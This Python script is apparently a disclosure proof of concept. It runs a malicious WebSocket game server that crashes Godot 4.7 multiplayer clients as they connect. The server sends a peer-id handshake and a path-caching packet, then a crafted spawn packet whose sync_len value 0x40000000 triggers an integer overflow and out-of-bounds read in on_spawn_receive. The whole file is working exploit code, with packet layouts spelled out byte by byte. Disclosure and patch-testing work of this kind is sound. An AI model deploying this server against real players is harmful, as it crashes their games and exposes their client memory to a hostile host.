#!/usr/bin/env python3
"""Disclosure 006 — MALICIOUS WEBSOCKET SERVER (PoC, attacker side).

When a Godot 4.7 multiplayer client connects, this server sends ONE crafted
NETWORK_COMMAND_SPAWN packet that crashes the client via the integer-overflow /
OOB-read bug in SceneReplicationInterface::on_spawn_receive.

Demo shape ("the server you connect to hacks the player"): the victim runs the
stock Godot client (victim_client.gd) which connects to this URL. No file is
involved — purely a network packet from a server the client chose to connect to.

Sends, in order, as binary WebSocket messages:
  1. A 4-byte LE int32 = the client's assigned peer id (2). This is the
     WebSocketMultiplayerPeer handshake (server sends the peer id on connect).
  2. A NETWORK_COMMAND_SIMPLIFY_PATH packet caching the client's spawner under
     cache id 1 (so on_spawn_receive's get_cached_object returns the spawner).
  3. The malicious NETWORK_COMMAND_SPAWN with sync_len = 0x40000000.

Run:
  python server.py
  # then run the Godot victim client (victim_client.gd) against it.

Env:
  LISTEN_PORT   (default 49200)  — port to listen on
  SPAWN_SYNC_LEN (default 0x40000000) — sync_len to send (probe with 0x10000000
                     for the no-overflow control, which must NOT crash)
"""

import asyncio
import os
import struct

import websockets
from websockets.exceptions import ConnectionClosed

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "49200"))

NETWORK_COMMAND_SIMPLIFY_PATH = 1
NETWORK_COMMAND_SPAWN = 4

SYNC_LEN_OVERFLOW = 0x40000000
_SYNC_LEN = int(os.environ.get("SPAWN_SYNC_LEN", str(SYNC_LEN_OVERFLOW)), 0)

CACHE_ID = 1
# Path of the victim's MultiplayerSpawner (victim_client.gd builds this tree).
SPAWNER_PATH = "/root/World/Spawner"


def u32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


def build_simplify_path(cache_id: int, path: str) -> bytes:
    """Layout (process_simplify_path): [cmd(1)] [md5+null(33)] [u32 id] [raw path to EOF].
    The md5 mismatch only prints a warning; the cache entry is still created."""
    pkt = bytearray()
    pkt.append(NETWORK_COMMAND_SIMPLIFY_PATH)
    pkt += bytes(33)            # md5 (32) + trailing \0
    pkt += u32(cache_id)
    pkt += path.encode("utf-8")  # raw path, read to end of packet (no length prefix)
    return bytes(pkt)


def build_malicious_spawn(cache_id: int, sync_len: int) -> bytes:
    """Layout (on_spawn_receive):
        [0]  u8  cmd(4)        [1]  u8  scene_id(moot)
        [2..5]  u32 node_target -> cache_id (the spawner)
        [6..9]  u32 net_id     [10..13] u32 sync_len  *** overflow ***
        [14..17] u32 name_len=1  [18] 'a'  [19..] slack
    """
    pkt = bytearray()
    pkt.append(NETWORK_COMMAND_SPAWN)
    pkt.append(0)                       # scene_id (moot; overflow fires before instantiate_*)
    pkt += u32(cache_id)               # node_target -> spawner
    pkt += u32(1)                       # net_id
    pkt += u32(sync_len)                # *** the overflow ***
    pkt += u32(1)                       # name_len = 1 (>=1, and <= len-18)
    pkt.append(0x61)                    # 'a'
    pkt += bytes(8)                     # slack (realistic; keeps early iters in-bounds)
    return bytes(pkt)


async def handle_client(ws):
    print(f"[server] Godot client connected from {ws.remote_address}")
    try:
        await ws.send(struct.pack("<i", 2))            # step 1: peer id = 2
        print("[server] sent peer id = 2")
        await asyncio.sleep(0.3)
        await ws.send(build_simplify_path(CACHE_ID, SPAWNER_PATH))  # step 2
        print(f"[server] cached spawner path '{SPAWNER_PATH}' as id {CACHE_ID}")
        await asyncio.sleep(0.3)
        await ws.send(build_malicious_spawn(CACHE_ID, _SYNC_LEN))  # step 3: the crash
        print(f"[server] sent malicious SPAWN (sync_len=0x{_SYNC_LEN:X})")
        print("[server] if the victim is Godot 4.7, it should now crash in on_spawn_receive.")
        await asyncio.sleep(5.0)
    except ConnectionClosed:
        print("[server] client closed (already crashed?)")


async def main():
    print(f"[server] listening on ws://{LISTEN_HOST}:{LISTEN_PORT} (malicious game server)")
    print("[server] waiting for a Godot 4.7 victim client to connect...")
    async with websockets.serve(handle_client, LISTEN_HOST, LISTEN_PORT, max_size=2 ** 24):
        await asyncio.Future()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[server] shutting down.")
